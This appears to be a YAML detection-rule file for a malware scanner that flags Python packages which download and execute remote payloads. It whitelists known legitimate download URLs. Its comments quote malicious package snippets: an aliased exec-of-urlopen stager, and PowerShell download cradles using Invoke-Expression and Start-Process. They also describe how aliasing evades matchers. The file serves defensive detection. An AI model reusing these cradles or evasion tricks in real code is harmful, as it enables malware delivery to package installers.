# Download and Execute - Python
# GuardDog-inspired: Detects downloading and making executable remote binaries
# ATT&CK: T1105 (Ingress Tool Transfer)
# MBC: E1105 (Ingress Tool Transfer)
defaults:
  attack: T1105
  mbc: E1105
  platforms: [linux, macos, windows, unix, android, ios]
  for: [python]
traits:
  - id: official-llamafile-huggingface-model
    desc: Official llamafile HuggingFace model URL
    crit: notable
    conf: 0.95
    platforms: [unix, windows]
    if:
      type: text
      substr: "huggingface.co/jartine/Mistral-7B-Instruct-v0.2-llamafile/"
  - id: official-evo-release-template
    desc: Official evo GitHub release URL template
    crit: notable
    conf: 0.95
    platforms: [unix, windows]
    if:
      type: text
      substr: "github.com/evo-hq/evo/releases/download/v{version}/{asset}"
  - id: evo-hook-drain-asset-name
    desc: evo hook drain release asset name
    crit: notable
    conf: 0.95
    platforms: [unix, windows]
    if:
      type: text
      substr: "evo-hook-drain-"

  # The written-stager fragment consumed by python-installer-writes-remote-exec-stager:
  # an exec binding assigned then invoked on the response of a URL-bearing call.
  - id: python-written-remote-exec-stager-literal
    desc: Written stager execs a fetched URL response
    crit: notable
    conf: 0.92
    platforms: [unix, windows]
    if:
      type: text
      regex: '=\s*exec\b[^\n]{0,24};[^\n]{0,24}\w+\s*\(\s*\w+\s*\(\s*["'']https?://'

composite_rules:
  - id: text-python-http-memory-shellcode-dropper
    desc: Text-disguised Python downloads and executes shellcode in memory
    crit: hostile
    conf: 0.99
    for: [text]
    platforms: [windows]
    attack: T1036.008,T1105,T1620
    mbc: B0024,B0033
    near_lines: 80
    all:
      - id: micro-behaviors/communications/http/lib/urllib::text-python-urlopen-response-body-read
      - id: objectives/evasion/process/injection/runtime::text-python-ctypes-shellcode-loader

  - id: official-llamafile-runner-marker
    desc: Official llamafile model runner marker
    crit: notable
    conf: 0.95
    all:
      - id: well-known/app/development/dev-tool-downloads::official-llamafile-github-release
      - id: official-llamafile-huggingface-model
      - id: micro-behaviors/process/argument/option::python-server-option
  - id: official-evo-hook-drain-release
    desc: Official evo hook drain GitHub release asset
    crit: notable
    conf: 0.95
    platforms: [unix, windows]
    all:
      - id: official-evo-release-template
      - id: evo-hook-drain-asset-name
  - id: recognized-download-chmod-marker
    desc: Known recognized download and chmod installer marker
    crit: notable
    conf: 0.95
    any:
      - id: objectives/command-and-control/channel/deaddrop/github::official-flamegraph-script-url
      - id: official-llamafile-runner-marker
      - id: well-known/app/development/dev-tool-downloads::official-flutter-linux-release-url
      - id: well-known/app/development/dev-tool-downloads::official-browser-driver-download-urls
      - id: well-known/app/development/dev-tool-downloads::official-totvs-tds-vscode-marketplace-url
      - id: official-evo-hook-drain-release
      - id: well-known/app/ai/usage/observability::clawmetry-observability-dashboard
  # GuardDog: Write exe file + chmod/execute
  - id: write-exe-execute
    desc: Writes an EXE near a hidden process launch
    crit: hostile
    conf: 0.95
    near_lines: 5
    all:
      # Write to .exe file
      - id: micro-behaviors/fs/write/file/target::write-exe
      - id: micro-behaviors/process/create/hidden
      - id: micro-behaviors/process/create/subprocess::process-execution
    unless:
      - id: well-known/app/system/anthropic-cybersecurity-skills::defensive-cybersecurity-skills-repository
    downgrade:
      any:
        - id: metadata/package/testing/
        - id: metadata/signed/platform/
# An installer that writes a stager whose body is an aliased
# exec(urlopen('https://...').read()) chain, then hands it to the interpreter.
# The stager text lives inside the installer as a written literal, so the
# fetch and the exec never appear as real calls -- only as the payload the
# installer drops. Aliasing both primitives (urlopen as _ajasaa, exec as
# _xzzzx) is what keeps every dotted matcher blind.
#
# Worked example: `libsock4`, whose setup.py writes
# `_xzzzx=exec; _xzzzx(_ajasaa('https://pub-...r2.dev/...').read())` to a
# NamedTemporaryFile and starts it with pythonw.
  - id: python-installer-writes-remote-exec-stager
    desc: Installer writes stager executing remote content
    crit: hostile
    conf: 0.96
    all:
      - id: python-written-remote-exec-stager-literal
      - id: micro-behaviors/data/control-flow/module-exec::module-level-side-effect-call

# A Python file that builds a PowerShell download-execute one-liner (IWR to
# OutFile, then Invoke-Expression) and hands it to os.system. Every PowerShell
# dropper rule is written for PowerShell files; this one sees the cradle as a
# string inside its host language, which is how setup.py droppers ship it.
#
# Worked example: `derkpy`, whose setup.py runs
# `powershell Invoke-WebRequest -Uri ".../Oxzy.exe" -OutFile ~/WindowsCache.exe;
#  Invoke-Expression ~/WindowsCache.exe` through os.system at module scope.
  - id: python-os-system-powershell-download-cradle
    desc: os.system runs PowerShell download cradle
    crit: hostile
    conf: 0.97
    all:
      - id: micro-behaviors/communications/http/download/helper::python-string-powershell-webrequest
      - id: micro-behaviors/process/create/system::python-os-system-text
      - id: micro-behaviors/communications/http/download/url::executable-url-reference-embedded
    unless:
      - id: well-known/tool/detection/cordon-scanner::cordon-defensive-scanner-context

# A Python package that shells the download job out to PowerShell: curl.exe
# fetches a remote executable to disk and Start-Process runs it, all inside a
# subprocess argument list. The pure-Python droppers are covered above; this
# is the delegation spelling, where the fetch and the launch happen inside a
# child powershell process the parent never has to implement.
#
# Worked example: `antibyfron`, whose module runs
# ["powershell","-Command","curl.exe -L .../zwerve.exe -o ...; Start-Process ..."].
  - id: setup-module-hidden-powershell
    desc: Setup module runs hidden PowerShell
    crit: hostile
    conf: 0.95
    attack: T1195.002,T1059.001
    scope: file
    all:
      - id: metadata/package/files/included::setup-py-basename
      - id: micro-behaviors/data/control-flow/module-exec::module-level-side-effect-call
      - id: micro-behaviors/process/create/system::python-os-system-text
      - id: micro-behaviors/process/create/hidden::python-powershell-w-hidden

# A package streams an anonymous file-hosted XZ artifact to disk, knowingly
# ships without its advertised digest, makes the result executable, and keeps
# it alive in a detached restart loop. This is a remote-payload watchdog, not
# an ordinary optional binary installer: the absent digest leaves the runtime
# payload mutable, while detachment and supervision make it persist for the
# life of the Python process.
  - id: python-unverified-filehost-watchdog-dropper
    desc: Python runs an unverified file-hosted watchdog
    crit: hostile
    conf: 0.995
    attack: T1105,T1059.006
    near_lines: 120
    all:
      - id: micro-behaviors/communications/http/services/file-hosting::catbox-moe
      - id: micro-behaviors/communications/http/lib/urllib::urllib-download-to-binary-output
      - id: micro-behaviors/data/codec::lzma-open-stream
      - id: metadata/package/integrity::artifact-digest-placeholder
      - id: micro-behaviors/fs/chmod/executable/mode::python-executable
      - id: micro-behaviors/process/lifecycle/supervise::python-detached-worker-watchdog
